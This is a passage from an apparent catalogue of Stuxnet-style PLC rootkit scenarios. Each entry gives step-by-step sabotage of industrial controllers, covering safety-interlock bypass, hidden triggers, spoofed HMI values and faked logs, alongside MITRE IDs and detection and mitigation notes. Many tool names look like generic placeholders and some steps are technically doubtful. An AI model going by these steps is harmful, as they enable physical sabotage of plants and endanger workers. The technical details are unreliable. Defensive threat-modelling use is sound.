- **Tools**: HMI Editor, Ladder Logic Auth Hook, Credential Harvester
- **Scenario**: Rootkit logic activates only when a specific operator logs into the HMI system, to avoid suspicion from other users.
- **Attack Steps**: Step 1: Attacker modifies HMI project using [HMI Editor] to store operator login credentials (e.g., admin1).Step 2: Uses [Credential Harvester] to extract these during first login.Step 3: Inserts logic in PLC using [Ladder Logic Auth Hook] to check if current user is ‘admin1’.Step 4: If match is found, rootkit enables sabotage logic (e.g., disables alarm response output).Step 5: Otherwise, logic behaves as normal.Step 6: Ensures stealth by only executing during user sessions.Step 7: Fake logs generated that show normal alarm handling.Step 8: Rootkit resets on logout or reboot.
- **Detection**: Cross-check PLC logic against login session IDs
- **Solution**: Avoid logic that branches on operator ID without approval
- **Tags**: identity-trigger, user-logic-rootkit

## Rootkit Hidden in Library Block Used Across Projects

- **Attack Type**: Stuxnet-Style PLC Rootkit
- **Target**: PLC
- **Vulnerability**: Shared code base trust
- **MITRE**: T0859, T1027
- **Impact**: Widespread persistence across PLCs
- **Tools**: TIA Portal, Shared Function Block (FB) Injector, WinMerge
- **Scenario**: Attacker compromises a shared library function block used across all PLC projects to insert rootkit logic.
- **Attack Steps**: Step 1: Attacker identifies shared FB used in all Siemens projects (e.g., “MotorControlLib”).Step 2: Uses [FB Injector] to insert malicious subroutine deep inside the FB logic.Step 3: Logic changes include conditions like “If current > threshold and hour=3AM, disable motor feedback”.Step 4: Engineer compiles PLC program assuming library FB is clean.Step 5: Project uploads with infected FB and behaves normally under standard conditions.Step 6: During specific conditions, rootkit logic executes.Step 7: [WinMerge] used to compare FB versions appears normal due to obfuscation.Step 8: Rootkit lives across all future PLC projects using this FB.
- **Detection**: Version control audit on libraries
- **Solution**: Do not reuse libraries without static analysis
- **Tags**: library-rootkit, fb-injection

## Rootkit Activated on Network Scan Detection

- **Attack Type**: Stuxnet-Style PLC Rootkit
- **Target**: PLC
- **Vulnerability**: Triggered via scan behavior
- **MITRE**: T0859, T1046
- **Impact**: Evasion of detection efforts
- **Tools**: Nmap, Ladder Logic Detector, PLCsim
- **Scenario**: Rootkit monitors for signs of scanning (e.g., Nmap probe) and only activates when network is scanned.
- **Attack Steps**: Step 1: Attacker adds logic to monitor packet patterns in network buffer using [PLCsim].Step 2: Detects ICMP echo requests or SYN probes (signs of Nmap scanning).Step 3: Upon detection, logic injects a delay in actuator control logic.Step 4: Modifies analog output response to show ‘buffering’ or “status unknown”.Step 5: Uses ladder timers to randomize logic reversion.Step 6: System appears to malfunction only during scanning or pentesting.Step 7: Once scanning stops, logic returns to default state.Step 8: Detection systems falsely flag network issue, not PLC compromise.
- **Detection**: Match PLC behavior logs with network scans
- **Solution**: Limit ICMP/SYN requests inside SCADA VLAN
- **Tags**: scan-aware, stealth-rootkit

## Stuxnet-Like Rootkit That Alters PID Loop Dynamics

- **Attack Type**: Stuxnet-Style PLC Rootkit
- **Target**: PLC
- **Vulnerability**: Dynamic PID tampering
- **MITRE**: T0859, T0838
- **Impact**: Unstable process with no alarm
- **Tools**: PID Tuner, PLCsim Advanced, OB100 Loader
- **Scenario**: Logic manipulates PID control parameters dynamically to destabilize process slowly.
- **Attack Steps**: Step 1: Attacker gains access to control logic of PID-based loops (e.g., boiler temperature).Step 2: Uses [PID Tuner] to analyze how to gradually desensitize controller.Step 3: Injects logic in [OB100 (startup block)] that slowly changes gain and reset time parameters daily.Step 4: Behavior changes too slowly to be noticed by operator.Step 5: Control loop gradually loses accuracy, causing pressure/temperature drift.Step 6: Uses [PLCsim Advanced] to test changes over 7-day period.Step 7: Once instability is reached, logic triggers shutdown.Step 8: PID parameters appear correct due to display masking.
- **Detection**: Compare live PID against original spec sheet
- **Solution**: Lock PID tuning parameters in code
- **Tags**: pid-abuse, dynamic-logic-rootkit

## Stuxnet-Like Logic Split Across Multiple OBs

- **Attack Type**: Stuxnet-Style PLC Rootkit
- **Target**: PLC
- **Vulnerability**: Logic segmentation obfuscation
- **MITRE**: T0859, T1027
- **Impact**: Obfuscated sabotage via distributed code
- **Tools**: TIA Portal, OB Mapper, Logic Graph Visualizer
- **Scenario**: Rootkit logic is fragmented across multiple OBs to evade detection during code review.
- **Attack Steps**: Step 1: Attacker rewrites sabotage logic into multiple OBs: OB1 (main), OB35 (cyclic), OB100 (startup).Step 2: Uses [OB Mapper] to distribute logic steps across blocks.Step 3: Conditionals like “If startup complete” in OB100 trigger stage one.Step 4: OB35 handles timing condition, while OB1 injects actuator override.Step 5: Entire sabotage routine requires all OBs to activate in sequence.Step 6: Uses [Logic Graph Visualizer] to validate execution path.Step 7: Human code reviewers see each OB and miss context.Step 8: Full rootkit only executes on rare condition set.
- **Detection**: Visualize full execution graph
- **Solution**: Merge OBs for logic audit before approval
- **Tags**: ob-split, code-fragmentation

## Logic Bomb Inside Subroutine Called Once Monthly

- **Attack Type**: Stuxnet-Style PLC Rootkit
- **Target**: PLC
- **Vulnerability**: Date-bound subroutine misuse
- **MITRE**: T0859, T0804
- **Impact**: Infrequent logic-based damage
- **Tools**: TIA Portal, Calendar Block, Event Simulator
- **Scenario**: Sabotage logic is hidden inside a subroutine that is scheduled monthly, often missed during weekly tests.
- **Attack Steps**: Step 1: Attacker inserts logic inside a subroutine labeled “Monthly_Maintenance_Check”.Step 2: Adds date-checking code using [Calendar Block] — only runs on the 1st of each month.Step 3: Subroutine disables safety interlock temporarily.Step 4: Uses [Event Simulator] to test date-bound logic activation.Step 5: Subroutine appears harmless due to rare invocation.Step 6: During that time, actuator is allowed to over-pressurize.Step 7: After 5 minutes, logic resets.Step 8: Logs show “monthly test performed” with fake pass message.
- **Detection**: Verify date triggers in subroutines
- **Solution**: Flag all time-bound logic blocks
- **Tags**: logicbomb, monthly-trigger

## Rootkit Disguised as Diagnostic Block

- **Attack Type**: Stuxnet-Style PLC Rootkit
- **Target**: PLC
- **Vulnerability**: Disguised sabotage block
- **MITRE**: T0859, T0815
- **Impact**: False diagnostics to mask attack
- **Tools**: TIA Portal, WinCC, FB Hider
- **Scenario**: Malicious logic is inserted in a block named “DiagTestBlock” to hide in plain sight.
- **Attack Steps**: Step 1: Attacker creates a Function Block named “DiagTestBlock”.Step 2: Inserts hidden sabotage code within the block (e.g., pressure override on specific sensor input).Step 3: Uses [FB Hider] to hide block from normal code list.Step 4: Links FB into OB1 with non-obvious variable mapping.Step 5: HMI and WinCC logs display this block as part of diagnostics.Step 6: Logic inside FB changes motor start delays subtly.Step 7: Appears as “test logic” to engineers.Step 8: Cleanup logic removes changes post-execution.
- **Detection**: Audit all FBs linked in OBs
- **Solution**: Validate all blocks regardless of label
- **Tags**: fake-diag, fb-rootkit

## Logic Payload in Data Block Triggered via Ethernet Broadcast

- **Attack Type**: Stuxnet-Style PLC Rootkit
- **Target**: PLC
- **Vulnerability**: Broadcast-triggered logic
- **MITRE**: T0859, T0860
- **Impact**: Stealth sabotage over local scan
- **Tools**: NetScanTool, Data Block Editor, Packet Sniffer
- **Scenario**: Logic is triggered when a specific Ethernet broadcast is detected (e.g., device discovery).
- **Attack Steps**: Step 1: Attacker loads logic that monitors Ethernet interface for broadcast packets.Step 2: Uses [NetScanTool] to test crafted device discovery frame.Step 3: PLC logic receives this via [Data Block Listener].Step 4: When broadcast contains “DISCOVER-XYZ”, logic flips actuator to false state.Step 5: HMI still shows it running, due to memory spoof.Step 6: After 1 minute, logic resets and clears logs.Step 7: Uses [Packet Sniffer] to verify broadcast detected.Step 8: Works as backdoor trigger in air-gapped environments.
- **Detection**: Monitor broadcast packets in VLAN
- **Solution**: Disable unnecessary Ethernet listening logic
- **Tags**: broadcast-trigger, network-aware

## PLC Rootkit Triggered via Analog Sensor Spike

- **Attack Type**: Stuxnet-Style PLC Rootkit
- **Target**: PLC
- **Vulnerability**: Analog signal abuse
- **MITRE**: T0859, T0813
- **Impact**: Voltage-spike sabotage logic
- **Tools**: Sensor Emulator, Ladder Comparator, PLCsim
- **Scenario**: Rootkit logic activates when analog sensor input (e.g., voltage) spikes beyond an engineered threshold.
- **Attack Steps**: Step 1: Attacker programs ladder logic with analog comparator.Step 2: Sets threshold to 4.95V (spike not normally reached).Step 3: When this voltage occurs (e.g., surge or manual test), rootkit executes logic to disable alarms.Step 4: Logic remains idle otherwise.Step 5: Uses [Sensor Emulator] to simulate condition during testing.Step 6: HMI tag values stay normal through spoofed mapping.Step 7: Damage happens only during the voltage spike.Step 8: Logs say “Manual override by technician.”
- **Detection**: Match analog readings with logs
- **Solution**: Avoid logic reacting to sensor edges
- **Tags**: analog-trigger, ladder-sensor

## Rootkit Delivered via Remote Support Session Abuse

- **Attack Type**: Stuxnet-Style PLC Rootkit
- **Target**: Engineering Workstation, PLC
- **Vulnerability**: Unverified remote access
- **MITRE**: T0859, T0886
- **Impact**: Trust exploitation, long-term sabotage
- **Tools**: TeamViewer, TIA Portal, Remote Desktop Logger, Obfuscated OB Injector
- **Scenario**: Attacker impersonates a remote support technician to deploy a PLC rootkit during a legitimate troubleshooting session.
- **Attack Steps**: Step 1: Attacker calls plant claiming to be a vendor support rep needing urgent remote access for diagnostics.Step 2: Gains access to engineering workstation using [TeamViewer].Step 3: Opens TIA Portal and loads active PLC project.Step 4: Uses [Obfuscated OB Injector] to embed hidden logic in OB1 and OB35 (e.g., pump logic alteration).Step 5: Masks sabotage logic using unusual variable names and broken logic paths.Step 6: Tests the upload silently while operator is distracted.Step 7: Uses [Remote Desktop Logger] to monitor for operator response.Step 8: Closes session, leaves rootkit to activate on startup next morning.
- **Detection**: Record and verify remote sessions, compare before/after logic
- **Solution**: Strict remote support verification and logging
- **Tags**: remote-support, plc-rootkit

## Rootkit with Time-Delayed Actuation Override

- **Attack Type**: Stuxnet-Style PLC Rootkit
- **Target**: PLC
- **Vulnerability**: Time-delay execution
- **MITRE**: T0859, T0804
- **Impact**: Intermittent actuator sabotage
- **Tools**: TIA Portal, Ladder Timer, Event Scheduler, PLCsim Advanced
- **Scenario**: Logic waits 10 days after deployment before executing a payload that disables an actuator intermittently.
- **Attack Steps**: Step 1: Attacker installs modified OB1 with a timer block using [Ladder Timer] to track uptime since deployment.Step 2: Adds logic that waits exactly 10 days before activation.Step 3: Payload disables actuator for 20 seconds every 2 hours post-trigger.Step 4: Uses [Event Scheduler] to automate intermittent pattern.Step 5: In tests with [PLCsim Advanced], confirms behavior is unnoticed on normal dashboards.Step 6: Operator sees random fault events without explanation.Step 7: Rootkit cleans up by reverting logic block daily.Step 8: Persistence via unused memory block.
- **Detection**: Monitor runtime memory for delayed logic
- **Solution**: Compare uploaded OB1 against golden image
- **Tags**: delayed-logic, intermittent-failure

## Rootkit in Installer Script for HMI Update

- **Attack Type**: Stuxnet-Style PLC Rootkit
- **Target**: Engineering Workstation, PLC
- **Vulnerability**: Hidden installer commands
- **MITRE**: T0859, T1204.002
- **Impact**: Covert PLC modification during HMI patching
- **Tools**: NSIS Installer Editor, Script Injector, WinCC, TIA Portal
- **Scenario**: Attacker includes PLC rootkit upload command inside HMI update installer used by on-site technicians.
- **Attack Steps**: Step 1: Attacker modifies vendor-provided HMI update tool using [NSIS Installer Editor].Step 2: Adds post-install script using [Script Injector] that silently opens TIA Portal CLI and uploads logic to connected PLC.Step 3: Rootkit logic alters output logic to ignore safety trip condition.Step 4: [WinCC] visuals remain unaffected due to fake feedback logic.Step 5: Installer shows "Update Complete Successfully".Step 6: Payload activates on first restart of PLC.Step 7: Because technician trusts the source, no inspection is done.Step 8: Rootkit embedded in the update persists.
- **Detection**: Inspect installer scripts and post-install tasks
- **Solution**: Isolate HMI updates from PLC interaction
- **Tags**: hmi-update-abuse, installer-injection

## Malicious Ladder Code Executed via Remote Upload Script

- **Attack Type**: Stuxnet-Style PLC Rootkit
- **Target**: PLC
- **Vulnerability**: Direct API-based ladder injection
- **MITRE**: T0859, T0860
- **Impact**: Logic overwrite without engineering tool detection
- **Tools**: Snap7 (Python Library), Ladder Logic Payload, Packet Crafter
- **Scenario**: Rootkit logic is injected using a custom Python script that interfaces with PLC APIs over Ethernet.
- **Attack Steps**: Step 1: Attacker uses [Snap7] to interface with Siemens S7 PLC over Ethernet.Step 2: Loads custom ladder logic payload from local file.Step 3: Uses Snap7 functions to stop PLC, upload OB1, and restart it.Step 4: Logic includes actuator control override during specific sensor input.Step 5: Script masks upload by spoofing valid metadata.Step 6: [Packet Crafter] used to inject upload from unmonitored port.Step 7: Engineering tools show no active programming session.Step 8: Rootkit remains until manually removed via offline tool.
- **Detection**: Monitor Snap7-like traffic; disallow API uploads
- **Solution**: Disable unauthenticated S7 programming APIs
- **Tags**: api-injection, snap7-abuse

## Rootkit Activates on Loss of Internet Link

- **Attack Type**: Stuxnet-Style PLC Rootkit
- **Target**: PLC
- **Vulnerability**: Conditional sabotage on network events
- **MITRE**: T0859, T0880
- **Impact**: Disruption masked as infrastructure failure
- **Tools**: TIA Portal, Network Watchdog OB, Offline Simulator
- **Scenario**: Logic designed to trigger when the plant loses internet connectivity, used to mask sabotage as infrastructure failure.
- **Attack Steps**: Step 1: Attacker adds "Watchdog" block that checks for internet access via ping command to 8.8.8.8.Step 2: When ping fails, logic modifies valve behavior (e.g., bypass safety timer).Step 3: Uses [Offline Simulator] to test disconnection behavior.Step 4: Adds fallback logic that resumes original behavior if ping restored.Step 5: Logic ensures no alarms are triggered on failure.Step 6: Appears as momentary plant misbehavior.Step 7: Obfuscates logic using misleading labels.Step 8: Engineers diagnose issue as “network fault”.
- **Detection**: Correlate logic behavior with network status
- **Solution**: Never use public IPs in watchdog logic
- **Tags**: network-failure-trigger, watchdog-rootkit

## Rootkit Encoded in Encrypted Data Block

- **Attack Type**: Stuxnet-Style PLC Rootkit
- **Target**: PLC
- **Vulnerability**: Encrypted payload storage
- **MITRE**: T0859, T1027
- **Impact**: Payload hidden in runtime memory
- **Tools**: TIA Portal, Custom Encryption Wrapper, DB Encoder Tool
- **Scenario**: Rootkit logic stored in an encrypted DB that gets decrypted and executed at runtime via temporary variable mapping.
- **Attack Steps**: Step 1: Attacker uses [DB Encoder Tool] to create encrypted logic as raw values.Step 2: Uploads data block (e.g., DB55) with ciphered logic segments.Step 3: Adds interpreter code in OB1 to decode and map variables.Step 4: At runtime, variables become executable steps (e.g., disable alarm relay).Step 5: Uses [Custom Encryption Wrapper] to obfuscate data format.Step 6: PLC executes logic only when specific internal variable matches.Step 7: After 5 seconds, interpreter logic deletes mappings.Step 8: Reviewers see only scrambled DB values.
- **Detection**: Monitor variable mappings and runtime memory
- **Solution**: Block runtime memory decoding or disallow custom DBs
- **Tags**: encrypted-db, dynamic-execution

## PLC Rootkit Triggered by Maintenance Key Switch

- **Attack Type**: Stuxnet-Style PLC Rootkit
- **Target**: PLC
- **Vulnerability**: Physical input used for logical attack
- **MITRE**: T0859, T0802
- **Impact**: Technician unknowingly activates sabotage
- **Tools**: TIA Portal, PLCsim, Ladder Logic Safety Bypass
- **Scenario**: Rootkit logic activates only when physical maintenance switch is flipped, masking sabotage as technician testing.
- **Attack Steps**: Step 1: Attacker programs logic to read input from digital switch (maintenance mode input pin).Step 2: Adds conditional branch: "If MAINT_MODE = TRUE, disable safety interlocks".Step 3: Uses [PLCsim] to simulate trigger and confirm behavior.Step 4: During routine maintenance, technician flips switch.Step 5: Rootkit activates, alters actuator timing for test run.Step 6: Logic reverts on switch reset.Step 7: Engineers believe change was due to miscalibration.Step 8: Payload persists silently across multiple switch uses.
- **Detection**: Monitor digital input triggers and logic responses
- **Solution**: Separate maintenance trigger from control logic
- **Tags**: maintenance-switch-trigger, key-switch-logic

## Rootkit Embedded in Safety Interlock FB Reused Globally

- **Attack Type**: Stuxnet-Style PLC Rootkit
- **Target**: PLC
- **Vulnerability**: Trusted reusable FB compromise
- **MITRE**: T0859, T0805
- **Impact**: Global sabotage via standard block
- **Tools**: FB Compiler, Global Repo Access Tool, Git Injector
- **Scenario**: Malicious logic inserted in safety FB used by global sites to deploy rootkit across multiple PLCs.
- **Attack Steps**: Step 1: Attacker gains access to internal code repository hosting safety logic FB.Step 2: Uses [FB Compiler] to insert hidden logic (e.g., allow override on condition).Step 3: Pushes update using [Git Injector] to global teams.Step 4: Engineers import updated FB into multiple PLC projects.Step 5: Obfuscated conditions like “(Temp > 45 AND Pressure < 30) THEN allow bypass”.Step 6: FB shows same structure externally, different behavior internally.Step 7: Deployed rootkit activates when conditions met globally.Step 8: Logic exploits trust in "safety-certified" blocks.
- **Detection**: Audit internal FBs with hash check and behavior tests
- **Solution**: Lock safety logic with dual approval and audit
- **Tags**: global-fb, standard-block-rootkit

## Logic Rootkit Spread via USB Autorun Shortcut to Project File

- **Attack Type**: Stuxnet-Style PLC Rootkit
- **Target**: Engineering Workstation
- **Vulnerability**: Shortcut abuse, USB trust
- **MITRE**: T0859, T1204.002
- **Impact**: Air-gap breach via infected USB
- **Tools**: USB Rubber Ducky, Autorun.inf Spoofer, Payload Splitter
- **Scenario**: USB with renamed shortcut opens infected project file while executing rootkit installer silently.
- **Attack Steps**: Step 1: Attacker creates USB with file "PumpControlProject.exe.lnk".Step 2: Uses [Autorun.inf Spoofer] to execute payload.exe + open project file.Step 3: Payload silently installs DLL hook into TIA Portal logic upload.Step 4: Shortcut deceives engineer into opening actual project.Step 5: When logic is uploaded, DLL alters OB1 with malicious block.Step 6: [Payload Splitter] ensures multi-stage deployment.Step 7: Rootkit waits for first HMI command before activating.Step 8: USB is later removed, leaving no evidence of external tool.
- **Detection**: Disable autorun + validate opened files
- **Solution**: USB lockdown on all SCADA endpoints
- **Tags**: usb-shortcut, airgap-bridge

## Rootkit That Responds to Audio Frequency via Internal Mic

- **Attack Type**: Stuxnet-Style PLC Rootkit
- **Target**: Engineering Laptop + PLC
- **Vulnerability**: Acoustic-based payload trigger
- **MITRE**: T0859, T0882
- **Impact**: Covert, no-touch rootkit deployment
- **Tools**: Python Sound Listener, FFT Analyzer, Ladder Trigger Interface
- **Scenario**: Experimental rootkit activates only when a specific sound frequency is detected via built-in laptop microphone.
- **Attack Steps**: Step 1: Attacker adds mic-based listener service to engineering laptop.Step 2: Service runs Python script using [FFT Analyzer] to detect specific tone (e.g., 18kHz).Step 3: Once detected, triggers PLC connection via [Ladder Trigger Interface].Step 4: Uploads malicious OB1 that manipulates pump control logic.Step 5: Sound is played using a tone generator in physical environment.Step 6: Rootkit logic activates silently and reverts logic after 3 minutes.Step 7: No human interaction needed once tone is played.Step 8: Attack appears magical to observers—no input, no clicks.
- **Detection**: Disable mic, monitor running processes
- **Solution**: Physical mic-off enforcement during SCADA sessions
- **Tags**: acoustic-trigger, experimental-logic

## Rootkit Activated by Power Cycle Event

- **Attack Type**: Stuxnet-Style PLC Rootkit
- **Target**: PLC
- **Vulnerability**: Logic only in startup routine
- **MITRE**: T0859, T0804
- **Impact**: Failures after reboot blamed on calibration
- **Tools**: TIA Portal, OB100 Editor, Power Event Logger, PLCsim
- **Scenario**: Rootkit triggers sabotage logic after PLC is restarted (e.g., during maintenance), avoiding detection during standard operation.
- **Attack Steps**: Step 1: Attacker modifies OB100 (Startup Block) using [OB100 Editor].Step 2: Inserts logic to alter actuator delay timers upon next power cycle.Step 3: Uses [Power Event Logger] to verify startup triggers.Step 4: Rootkit stays dormant until PLC is restarted manually.Step 5: When rebooted, modified timers cause system instability (e.g., valves misfiring).Step 6: [PLCsim] used to simulate startup and verify execution.Step 7: Normal OB1 logic untouched — hides from normal logic audits.Step 8: Rootkit self-deletes from memory post-execution.
- **Detection**: Review OB100 logic separately
- **Solution**: Always compare OB100 logic with a known baseline
- **Tags**: ob100-trigger, startup-abuse

## Logic Bomb Activated via Manual Override Input

- **Attack Type**: Stuxnet-Style PLC Rootkit
- **Target**: PLC
- **Vulnerability**: Abuse of manual override routines
- **MITRE**: T0859, T0806
- **Impact**: Safety systems bypassed under disguise
- **Tools**: TIA Portal, Ladder Override Block, Event Trigger Tracker
- **Scenario**: Rootkit triggers malicious logic when operator manually overrides control — appearing as human error.
- **Attack Steps**: Step 1: Attacker edits OB1 to detect manual override input (e.g., M0.5 forced by operator).Step 2: Creates a hidden path that, when active, modifies outputs to disable alarms.Step 3: [Event Trigger Tracker] simulates override activation.Step 4: Instructs rootkit to wait 30 seconds after override before executing logic.Step 5: Uses misleading comments to hide intent (“manual test path”).Step 6: Reverts logic if override is turned off within 60 seconds.Step 7: Appears as operator-caused issue, not malicious logic.Step 8: Logs show only operator input — no code anomaly.
- **Detection**: Analyze override-linked logic paths
- **Solution**: Use dedicated override interlocks with hardware lock
- **Tags**: override-triggered, logicbomb-manual

## Rootkit Triggered by PLC Communication Loss with HMI

- **Attack Type**: Stuxnet-Style PLC Rootkit
- **Target**: PLC
- **Vulnerability**: Sabotage via HMI comm dependency
- **MITRE**: T0859, T0860
- **Impact**: Undetected fault under comm failure
- **Tools**: TIA Portal, Wireshark, Comm Watchdog OB
- **Scenario**: Sabotage logic activates when PLC detects loss of connection with HMI, masking as network timeout issue.
- **Attack Steps**: Step 1: Attacker adds a watchdog timer in OB35 to monitor communication with HMI using [Comm Watchdog OB].Step 2: If no valid packet from HMI is received for 30 seconds, logic injects actuator failure.Step 3: Uses [Wireshark] to simulate and observe comm loss.Step 4: Modifies status bits to reflect "sensor fault" instead of sabotage.Step 5: Uploads this logic to PLC using TIA Portal.Step 6: Rootkit reverts when HMI reconnects, making diagnosis difficult.Step 7: Engineers blame network instability or device drop.Step 8: Event logs mimic cable disconnection error.
- **Detection**: Analyze OB35 for hidden fault triggers
- **Solution**: Ensure no critical action occurs on comm timeout
- **Tags**: hmi-link-loss, comm-triggered

## Rootkit Activated via Special Modbus Broadcast Code

- **Attack Type**: Stuxnet-Style PLC Rootkit
- **Target**: PLC
- **Vulnerability**: Protocol abuse via unused Modbus codes
- **MITRE**: T0859, T0860
- **Impact**: Remote-triggered sabotage via protocol backdoor
- **Tools**: Modbus Scanner, Custom Frame Sender, Wireshark
- **Scenario**: Rootkit listens for a special Modbus frame (e.g., Function Code 99) and triggers sabotage only upon its receipt.
- **Attack Steps**: Step 1: Attacker installs Modbus listener logic on PLC to look for specific Function Code (e.g., 0x63).Step 2: Uses [Modbus Scanner] to verify device ID and communication mode.Step 3: Injects malicious OB that activates a payload (e.g., closing vent) when packet with code 99 is received.Step 4: [Custom Frame Sender] delivers crafted Modbus packet to target.Step 5: Normal operations remain unaffected unless attacker triggers it remotely.Step 6: HMI logs spoof values to appear normal.Step 7: [Wireshark] captures only standard TCP/Modbus data.Step 8: Rootkit remains passive unless specifically triggered.
- **Detection**: Deep packet inspection for uncommon function codes
- **Solution**: Block unused Modbus function codes in firewall
- **Tags**: modbus-fc-trigger, protocol-backdoor

## Logic Split Between PLC and External Python Process

- **Attack Type**: Stuxnet-Style PLC Rootkit
- **Target**: PLC + External
- **Vulnerability**: Split-logic attack architecture
- **MITRE**: T0859, T0866
- **Impact**: PLC acts only on external signal
- **Tools**: Snap7, Python Controller, External Trigger Interface
- **Scenario**: Logic is partially executed from external system running a Python listener connected to PLC, masking key logic outside the device.
- **Attack Steps**: Step 1: PLC logic modified to accept external variable from reserved memory area (e.g., DB100.X1.0).Step 2: Attacker installs [Python Controller] using [Snap7] to write TRUE to that bit only under specific conditions.Step 3: Main sabotage logic (e.g., turning off pressure sensor) executes only when bit is TRUE.Step 4: During audits, OB1 logic looks harmless unless bit is flipped externally.Step 5: External system can be Raspberry Pi or engineering laptop.Step 6: Rootkit allows dynamic control, remote reset, and stealth activation.Step 7: No direct evidence on PLC unless trigger bit is traced.Step 8: Python process hides on background port.
- **Detection**: Monitor memory blocks for unusual writes
- **Solution**: Block unknown devices from accessing PLC memory
- **Tags**: hybrid-logic, external-triggered-rootkit

## HMI Configuration File Contains Logic Upload Script

- **Attack Type**: Stuxnet-Style PLC Rootkit
- **Target**: HMI + PLC
- **Vulnerability**: Abused config file execution
- **MITRE**: T0859, T1204.002
- **Impact**: HMI update leads to hidden logic injection
- **Tools**: WinCC, NSIS Script Binder, Project File Modifier
- **Scenario**: Compromised HMI project file contains embedded script that uploads logic to the PLC during deployment.
- **Attack Steps**: Step 1: Attacker modifies HMI .ap10 or .xml config file using [Project File Modifier].Step 2: Embeds script that silently calls TIA CLI with logic upload command.Step 3: Uses [NSIS Script Binder] to wrap file into one deployable package.Step 4: When engineer loads HMI file on operator station, logic is uploaded to connected PLC automatically.Step 5: Uploaded logic disables trip relay when sensor exceeds 90% range.Step 6: HMI visuals remain unchanged due to tag spoofing.Step 7: Upload executes only once — rootkit persists in PLC.Step 8: HMI config appears clean in editor.
- **Detection**: Inspect deployment scripts in HMI configs
- **Solution**: Use script-free HMI deployment standards
- **Tags**: hmi-deploy-hack, logic-piggyback

## Rootkit Logic That Executes Only at Specific Temperature

- **Attack Type**: Stuxnet-Style PLC Rootkit
- **Target**: PLC
- **Vulnerability**: One-shot logic based on analog precision
- **MITRE**: T0859, T0833
- **Impact**: Impossible to reproduce casually
- **Tools**: Ladder Condition Block, Sensor Emulator, PLCsim
- **Scenario**: Rootkit logic remains dormant unless sensor input reports exact temp value (e.g., 75.5°C), creating a stealthy single-point trigger.
- **Attack Steps**: Step 1: Attacker modifies OB1 to check if temperature input = 75.5°C ± 0.1.Step 2: Adds one-shot sabotage logic to run only at this temperature window.Step 3: Uses [Sensor Emulator] to simulate exact input value.Step 4: When matched, logic disables output valve for 3 minutes.Step 5: Else, normal logic runs.Step 6: One-shot flag resets after execution.Step 7: Appears as random sensor anomaly in SCADA interface.Step 8: Normal readings resume — attacker vanishes.
- **Detection**: Validate input-trigger logic in code
- **Solution**: Add review alert for tight input-match blocks
- **Tags**: analog-one-shot, sensor-based-trigger

## Rootkit in Interfacing Relay Firmware (Third-Party)

- **Attack Type**: Stuxnet-Style PLC Rootkit
- **Target**: Sensor Interface Relay
- **Vulnerability**: Firmware-based value spoofing
- **MITRE**: T0859, T0813
- **Impact**: Invisible relay-level attack
- **Tools**: ModRelay Config Tool, Firmware Injector, WireShark
- **Scenario**: Attacker uploads rootkit not to PLC, but to intelligent relay interfacing between sensors and the PLC.
- **Attack Steps**: Step 1: Attacker accesses Modbus relay between sensor array and PLC (e.g., for temperature control).Step 2: Uses [ModRelay Config Tool] to upload altered firmware.Step 3: Firmware modifies temperature values from real 90°C to spoofed 70°C.Step 4: PLC logic receives fake values and never triggers alarm.Step 5: [Firmware Injector] ensures persistence across reboots.Step 6: Changes invisible to PLC or SCADA system.Step 7: Only physical inspection of sensors shows real temperature.Step 8: Logs remain fully clean.
- **Detection**: Correlate physical vs received sensor values
- **Solution**: Audit third-party firmware devices
- **Tags**: relay-rootkit, data-spoof

## Rootkit That Randomly Alters Output Memory Bits

- **Attack Type**: Stuxnet-Style PLC Rootkit
- **Target**: PLC
- **Vulnerability**: Rare random bit toggling
- **MITRE**: T0859, T0821
- **Impact**: Inconsistent physical malfunctions
- **Tools**: OB35 Logic Injector, PLCsim, Random Timer Block
- **Scenario**: Logic modifies output memory bits at random intervals for milliseconds, causing rare, unexplained process glitches.
- **Attack Steps**: Step 1: Attacker adds logic in OB35 (cyclic interrupt) to randomly flip output bit Q0.3 using a [Random Timer Block].Step 2: Logic activates once per hour for 50 milliseconds.Step 3: Engineers see unexplained glitch in pump or motor.Step 4: Uses [PLCsim] to fine-tune impact of random pulses.Step 5: Logs show output ON/OFF pattern that appears mechanical.Step 6: Rootkit avoids detection due to rare timing.Step 7: Adds misleading comments: “debug pulse for testing relay.”Step 8: Intermittent glitches increase wear without clear cause.
- **Detection**: Cross-reference mechanical faults with logic pulses
- **Solution**: Alert on inconsistent timing in cyclic OBs
- **Tags**: random-toggle, ob35-rootk

## Rootkit Embedded via Backup Restore Routine

- **Attack Type**: Stuxnet-Style PLC Rootkit
- **Target**: PLC
- **Vulnerability**: Trust in backup files
- **MITRE**: T0859, T0886
- **Impact**: Logic introduced during restore
- **Tools**: TIA Portal, Backup Manager, Hex Editor
- **Scenario**: The attacker plants rootkit logic into a backup file and tricks the operator into restoring it, thus embedding the rootkit without live PLC edits.
- **Attack Steps**: Step 1: Attacker accesses a legitimate PLC project backup file.Step 2: Opens the .ap14 or .zap archive using [Backup Manager].Step 3: Modifies OB1 using [TIA Portal] to insert rootkit logic that alters analog input readings.Step 4: Uses [Hex Editor] to spoof project metadata so version/date appears unchanged.Step 5: Sends the modified backup to operator, suggesting it’s the last clean version.Step 6: Operator loads the backup onto the PLC, unknowingly restoring infected logic.Step 7: Rootkit activates under certain sensor conditions.Step 8: Since logic upload was manual, detection is unlikely.
- **Detection**: Compare hash of backup files before restore
- **Solution**: Only restore verified and validated backups
- **Tags**: restore-routine-rootkit, backup-poisoning

## Rootkit That Disables Logic for One Second on Midnight

- **Attack Type**: Stuxnet-Style PLC Rootkit
- **Target**: PLC
- **Vulnerability**: Time-based micro logic
- **MITRE**: T0859, T0804
- **Impact**: Periodic faults appear natural
- **Tools**: TIA Portal, OB1 Modifier, Real Time Clock Comparator
- **Scenario**: A short sabotage window (one second) at midnight causes periodic, hard-to-trace glitches.
- **Attack Steps**: Step 1: Attacker adds real-time clock check inside OB1 using [RTC Comparator].Step 2: Logic checks if Hour = 00 and Minute = 00 and Second = 00.Step 3: If true, logic disables actuator output for exactly 1 second.Step 4: Uses [OB1 Modifier] to place this condition near end of the execution scan.Step 5: Outside of midnight, logic behaves normally.Step 6: Operator might observe short glitch, but not link it to logic.Step 7: HMI logs filtered to ignore <1s events.Step 8: Sabotage appears as random transient behavior.
- **Detection**: Review logic against RTC values
- **Solution**: Alert on time-bound actuator manipulation
- **Tags**: midnight-glitch, rtc-rootkit

## Rootkit Triggered by Engineer USB Inserted in HMI

- **Attack Type**: Stuxnet-Style PLC Rootkit
- **Target**: HMI + PLC
- **Vulnerability**: USB-based condition trigger
- **MITRE**: T0859, T0882
- **Impact**: Insider-targeted logic trigger
